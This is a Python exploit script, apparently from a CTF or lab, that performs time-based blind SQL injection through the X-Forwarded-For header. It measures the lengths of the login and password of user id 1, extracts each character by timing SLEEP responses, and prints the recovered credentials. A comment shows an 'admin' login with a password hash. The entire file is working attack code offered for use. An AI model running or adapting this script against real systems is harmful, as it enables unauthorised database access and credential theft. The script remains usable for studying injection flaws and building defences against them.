# Time Based SQLi
import requests, sys

http_proxy = {"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

if len(sys.argv) < 2:
    print(f"Usage {sys.argv[0]} [target]")
    sys.exit(1)

target = sys.argv[1]

def lenSQLi(target, inj):
    len = 0
    url = f"http://{target}"
    for i in range(1, 33):
        payload = f"test' OR (SELECT IF(LENGTH((SELECT {inj} FROM users WHERE id=1 LIMIT 1))={i}, SLEEP(1), 0))"
        cust_header = {"X-Forwarded-For":f"{payload}-- -"}
        r = requests.get(url, headers=cust_header)
        if(r.elapsed.total_seconds() > 3):
            len = i
            break
    return len

def extractSQLi(target, inj):
    url = f"http://{target}"
    for i in range(32, 127):
        payload = inj.replace("[CHAR]", str(i))
        cust_header = {"X-Forwarded-For":f"{payload}-- -"}
        r = requests.get(url, headers=cust_header)
        if(r.elapsed.total_seconds() > 3):
            return i
    return None

def sendSQLi(target, r, inj):
    extracted = ""
    for i in range(1, r+1):
        payload = f"test' OR (IF(ascii(substring((select {inj} FROM users WHERE id=1 LIMIT 1), {i},1))=[CHAR], SLEEP(1), 1))"
        cval = extractSQLi(target, payload)
        if cval:
            extracted += chr(cval)
            # out_extracted = chr(cval)
            # sys.stdout.write(out_extracted)
            # sys.stdout.flush()
        else:
            break
    return extracted

def main():
    login_length = lenSQLi(target, "login")
    password_length = lenSQLi(target, "password")
    login = sendSQLi(target, login_length, "login")
    password = sendSQLi(target, password_length, "password")
    print(login + ":" + password) # admin:8efe310f9ab3efeae8d410a8e0166eb2

if __name__ == "__main__":
    main()